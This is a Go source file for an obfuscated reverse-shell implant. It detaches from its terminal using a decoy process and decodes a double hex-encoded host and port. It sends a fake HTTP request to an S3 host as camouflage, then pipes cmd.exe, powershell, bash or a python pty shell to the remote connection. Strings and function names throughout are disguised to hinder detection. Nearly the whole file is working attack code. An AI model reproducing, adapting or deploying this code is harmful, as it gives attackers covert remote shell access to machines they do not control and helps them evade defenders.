//go:build default
// +build default

package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var maison string
var chemin string
var keepalive string
var manualkeepalive string
var x []string = []string{"o", "y", "a", "e", "i", "u"}
var X []string = []string{"U", "I", "Y", "O", "A", "E", "/", `\`, `:`}

// "GET /george/kindness HTTP/1.1\r\nHost: reynolds.s3.amazonaws.com\r\nUser-Agent: strawberry/0.2.1\r\nAccept: application/json\r\n\r\n"
var webreq string = `G` + X[5] + `T ` + X[6] + `g` + x[3] + x[0] + `rg` + x[3] + X[6] + `k` + x[4] + `ndn` + x[3] + `ss HTTP` + X[6] + `1.1` + "\r\nH" + x[0] + `st` + X[8] + ` r` + x[3] + x[1] + `n` + x[0] + `lds.s3.` + x[2] + `m` + x[2] + `z` + x[0] + `n` + x[2] + `ws.c` + x[0] + `m` + "\r\n" + X[0] + `s` + x[3] + `r-` + X[4] + `g` + x[3] + `nt` + X[8] + ` str` + x[2] + `wb` + x[3] + `rr` + x[1] + X[6] + `0.2.1` + "\r\n" + X[4] + `cc` + x[3] + `pt` + X[8] + ` ` + x[2] + `ppl` + x[4] + `c` + x[2] + `t` + x[4] + x[0] + `n` + X[6] + `js` + x[0] + `n` + "\r\n"

// return exec.Command function
func addRole() func(name string, arg ...string) *exec.Cmd {
	return exec.Command
}

// Decoy, start a new process and do nothing
func startDB(ce string) {
	c := addRole()(ce, "nerienfaire") // exec.Command
	if err := c.Start(); err != nil {
		// "[PARENT] Error: %v"
		Critical.Printf("[P"+X[4]+"R"+X[5]+"NT] "+X[5]+"rr"+x[0]+"r: %v", err)
	}
}

// Detach
func Palmer() {
	if isLIB {
		EdwardsDial()
	}

	cwd, _ := os.Getwd()
	// "--child"
	ce, _ := os.Executable()
	startDB(ce)                          // Decoy
	c := addRole()(ce, "--ch"+x[4]+"ld") // exec.Command
	c.Env = os.Environ()
	c.Dir = cwd
	c.SysProcAttr = sp

	var quit bool
	var wg sync.WaitGroup

	// windows
	if runtime.GOOS == "w"+x[4]+"nd"+x[0]+"ws" {
		stdout, _ := c.StdoutPipe()
		stderr, _ := c.StderrPipe()
		wg.Add(2)
		go RP(stdout, os.Stdout, &quit, &wg, false)
		go RP(stderr, os.Stderr, &quit, &wg, false)
	} else {
		c.Stdout = os.Stdout
		c.Stderr = os.Stderr
	}

	if err := c.Start(); err != nil {
		// "[PARENT] Error: %v"
		Critical.Printf("[P"+X[4]+"R"+X[5]+"NT] "+X[5]+"rr"+x[0]+"r: %v", err)
	}

	// [PARENT] Started child (Pid %d)
	Info.Printf("[P"+X[4]+"R"+X[5]+"NT] St"+x[2]+"rt"+x[3]+"d ch"+x[4]+"ld (P"+x[4]+"d %d)", c.Process.Pid)

	// windows
	if runtime.GOOS == "w"+x[4]+"nd"+x[0]+"ws" {
		// "[PARENT] Streaming child stdout and stderr for a bit"
		Info.Printf("[P" + X[4] + "R" + X[5] + "NT] Str" + x[3] + x[2] + "m" + x[4] + "ng ch" + x[4] + "ld std" + x[0] + x[5] + "t " + x[2] + "nd std" + x[3] + "rr f" + x[0] + "r " + x[2] + " b" + x[4] + "t")
	}

	time.Sleep(time.Duration(2000 * time.Millisecond))

	// windows
	if runtime.GOOS == "w"+x[4]+"nd"+x[0]+"ws" {
		quit = true
		wg.Wait()
		// "[PARENT] End of stream"
		Info.Printf("[P" + X[4] + "R" + X[5] + "NT] " + X[5] + "nd " + x[0] + "f str" + x[3] + x[2] + "m")
	} else {
		c.Process.Release()
		// "[PARENT] Released child"
		Info.Printf("[P" + X[4] + "R" + X[5] + "NT] R" + x[3] + "l" + x[3] + x[2] + "s" + x[3] + "d ch" + x[4] + "ld")
	}

	time.Sleep(time.Duration(1000 * time.Millisecond))
}

// Interactive
func Richard(mode int8) {
	// "powershell.exe", "-c", "[console]::InputEncoding = [console]::OutputEncoding = New-Object System.Text.UTF8Encoding;powershell"
	xa := "[c" + x[0] + "ns" + x[0] + "l" + x[3] + "]::" + X[1] + "np" + x[5] + "t" + X[5] + "nc" + x[0] + "d" + x[4] + "ng = [c" + x[0] + "ns" + x[0] + "l" + x[3] + "]::" + X[3] + x[5] + "tp" + x[5] + "t" + X[5] + "nc" + x[0] + "d" + x[4] + "ng = N" + x[3] + "w-" + X[3] + "bj" + x[3] + "ct S" + x[1] + "st" + x[3] + "m.T" + x[3] + "xt." + X[0] + "TF8" + X[5] + "nc" + x[0] + "d" + x[4] + "ng;p" + x[0] + "w" + x[3] + "rsh" + x[3] + "ll." + x[3] + "x" + x[3]
	xb := "p" + x[0] + "w" + x[3] + "rsh" + x[3] + "ll." + x[3] + "x" + x[3]
	b := []string{xb, "-c", xa} // powershell.exe
	if runtime.GOOS != "w"+x[4]+"nd"+x[0]+"ws" {
		// /bin/bash
		b = []string{"/b" + x[4] + "n/b" + x[2] + "sh"} // bash
		if GardnerFileExist(b[0]) {                     // Check if file exist
			// `/usr/bin/python3` `-c` `import pty; pty.spawn("/bin/bash")`
			xc := x[4] + `mp` + x[0] + `rt pt` + x[1] + `; pt` + x[1] + `.sp` + x[2] + `wn("` + X[6] + `b` + x[4] + `n` + X[6] + `b` + x[2] + `sh")`
			xd := X[6] + x[5] + `sr` + X[6] + `b` + x[4] + `n` + X[6] + `p` + x[1] + `th` + x[0] + `n3`
			testb := []string{xd, `-c`, xc}
			// /bin/sh
			b = []string{X[6] + `b` + x[4] + `n` + X[6] + `sh`}
			if GardnerFileExist(testb[0]) {
				b = testb
			}
		} else {
			// /bin/sh
			b = []string{X[6] + `b` + x[4] + `n` + X[6] + `sh`}
		}
	}

	if mode == 3 {
		// 'C:\WINDOWS\SYSTEM32\CMD.EXE'
		b = []string{`C` + X[8] + X[7] + `W` + X[1] + `ND` + X[3] + `WS` + X[7] + `S` + X[2] + `ST` + X[5] + `M32` + X[7] + `CM` + `D.` + X[5] + `X` + X[5]} // c.exe
		// windows
		if runtime.GOOS != "w"+x[4]+"nd"+x[0]+"ws" {
			// /bin/sh
			b = []string{X[6] + `b` + x[4] + `n` + X[6] + `sh`} // sh
		}
	}

	mode = 0

	Info.Printf(`[`+X[1]+`NT`+X[5]+`R`+X[4]+`CT`+X[1]+`V`+X[5]+`] R`+x[5]+`nn`+x[4]+`ng `+X[8]+" %s", strings.Join(b, " "))
	cwd, _ := os.Getwd()
	c := addRole()(b[0], b[1:]...) // exec.Command
	c.Dir = cwd
	c.Env = os.Environ()
	c.SysProcAttr = sc

	var quit bool
	var wg sync.WaitGroup
	defer wg.Wait()

	stdout, _ := c.StdoutPipe()
	stderr, _ := c.StderrPipe()
	stdin, _ := c.StdinPipe()
	ka, _ := strconv.ParseBool(manualkeepalive)
	go StdMapper(stdout, stderr, stdin, os.Stdout, os.Stderr, os.Stdin, &quit, &wg, &mode, ka)

	if err := c.Start(); err != nil {
		// "[INTERACTIVE] Error: %v
		Critical.Printf(`[`+X[1]+`NT`+X[5]+`R`+X[4]+`CT`+X[1]+`V`+X[5]+`] `+X[5]+`rr`+x[0]+`r`+X[8]+" %v", err)
		mode = 3
	}

	done := make(chan bool)
	go func() {
		c.Wait()
		done <- true
	}()

	isquit := make(chan bool)
	go func() {
		for {
			time.Sleep(time.Duration(100 * time.Millisecond))
			if quit {
				isquit <- true
				break
			}
		}
	}()

	select {
	case <-done:
		quit = true
	case <-isquit:
		c.Process.Kill()
		c.Wait()
	}

	time.Sleep(time.Duration(500 * time.Millisecond))
	wg.Wait()

	if mode > 1 {
		Richard(mode)
	}
}

func EdwardsDial() {
	nd := net.Dial
	re := hex.DecodeString
	b1, _ := re(maison)
	b2, _ := re(string(b1))
	b3, _ := re(chemin)
	b4, _ := re(string(b3))

	conn, err := nd(string(b4), string(b2))
	if err != nil {
		// "[CHILD] Failed to join %s"
		Info.Printf(`[CH`+X[1]+`LD] F`+x[2]+x[4]+`l`+x[3]+`d t`+x[0]+` j`+x[0]+x[4]+"n %s (%s)", string(b2), string(b4))
		time.Sleep(time.Duration(1000 * time.Millisecond))
		EdwardsDial()
		return
	}

	// Set keepalive parameters
	ka, _ := strconv.ParseBool(keepalive)
	if ka {
		if c, ok := conn.(*net.TCPConn); ok {
			// Enable keepalive
			c.SetKeepAlive(true)

			// Set keepalive period (optional)
			c.SetKeepAlivePeriod(50 * time.Second)
		}
	}

	// "[CHILD] Connected to %s, waiting for response"
	Info.Printf(`[CH`+X[1]+`LD] C`+x[0]+`nn`+x[3]+`ct`+x[3]+`d t`+x[0]+" %s, w"+x[2]+x[4]+`t`+x[4]+`ng f`+x[0]+`r r`+x[3]+`sp`+x[0]+`ns`+x[3], string(b2))
	fmt.Fprintf(conn, webreq) // Fake HTTP Request

	done := make(chan bool)
	go func() {
		bufio.NewReader(conn).ReadString('\n') // Wait for any response
		done <- true
	}()
	select {
	case <-done:
		// "[CHILD] Response received"
		Info.Printf(`[CH` + X[1] + `LD] R` + x[3] + `sp` + x[0] + `ns` + x[3] + ` r` + x[3] + `c` + x[3] + x[4] + `v` + x[3] + `d`)
		defer conn.Close()
		CharlesLink(conn)
	case <-time.After(time.Duration(5000 * time.Millisecond)):
		// "[CHILD] No response, retrying ...."
		Info.Printf(`[CH` + X[1] + `LD] N` + x[0] + ` r` + x[3] + `sp` + x[0] + `ns` + x[3] + `, r` + x[3] + `tr` + x[1] + x[4] + `ng ....`)
		conn.Close()
		time.Sleep(time.Duration(1000 * time.Millisecond))
		EdwardsDial()
	}
}

func CharlesLink(conn net.Conn) {
	cwd, _ := os.Getwd()
	thisexe, _ := os.Executable()
	// "--interactive"
	bin := []string{thisexe, `--` + x[4] + `nt` + x[3] + `r` + x[2] + `ct` + x[4] + `v` + x[3]}
	if isLIB {
		// // 'C:\WINDOWS\SYSTEM32\CMD.EXE'
		bin = []string{`C` + X[8] + X[7] + `W` + X[1] + `ND` + X[3] + `WS` + X[7] + `S` + X[2] + `ST` + X[5] + `M32` + X[7] + `CMD.` + X[5] + `X` + X[5]}
	}
	c := addRole()(bin[0], bin[1:]...) // exec.Command
	c.SysProcAttr = sp
	if isLIB {
		c.SysProcAttr = sc
	}
	c.Dir = cwd
	c.Env = os.Environ()
	c.Stdin, c.Stdout, c.Stderr = conn, conn, conn
	if err := c.Start(); err != nil {
		// "[CHILD] Error: %v"
		Critical.Printf(`[CH`+X[1]+`LD] `+X[5]+`rr`+x[0]+`r`+X[8]+" %v", err)
		return
	}
	// "[CHILD] Linked to interactive"
	Info.Printf(`[CH` + X[1] + `LD] L` + x[4] + `nk` + x[3] + `d t` + x[0] + ` ` + x[4] + `nt` + x[3] + `r` + x[2] + `ct` + x[4] + `v` + x[3])
	c.Wait()
	// "[*] Goodbye ..."
	fmt.Fprintf(conn, "\n"+`[*] G`+x[0]+x[0]+`db`+x[1]+x[3]+` ...`+"\n")
}

func main() {
	a := false // isChild
	b := false // interactive
	if len(os.Args) > 1 {
		switch os.Args[1] {
		case `nerienfaire`:
			return
		case `--ch` + x[4] + `ld`:
			a = true
		// "--interactive"
		case `--` + x[4] + `nt` + x[3] + `r` + x[2] + `ct` + x[4] + `v` + x[3]:
			b = true
		}
	}
	SetAttr() // Set SysProcAttr
	if b {
		Richard(0) // Direct shell
		return
	}
	if a {
		// "[CHILD] Starting as child"
		Info.Printf(`[CH` + X[1] + `LD] St` + x[2] + `rt` + x[4] + `ng ` + x[2] + `s ch` + x[4] + `ld`)
		EdwardsDial() // Conn part
		// "[CHILD] Ending child process"
		Info.Printf(`[CH` + X[1] + `LD] ` + X[5] + `nd` + x[4] + `ng ch` + x[4] + `ld pr` + x[0] + `c` + x[3] + `ss`)
	} else {
		fmt.Println("")
		// "[PARENT] Starting child process"
		Info.Printf(`[P` + X[4] + `R` + X[5] + `NT] St` + x[2] + `rt` + x[4] + `ng ch` + x[4] + `ld pr` + x[0] + `c` + x[3] + `ss`)
		Palmer() // Detach program from parent terminal
	}
}
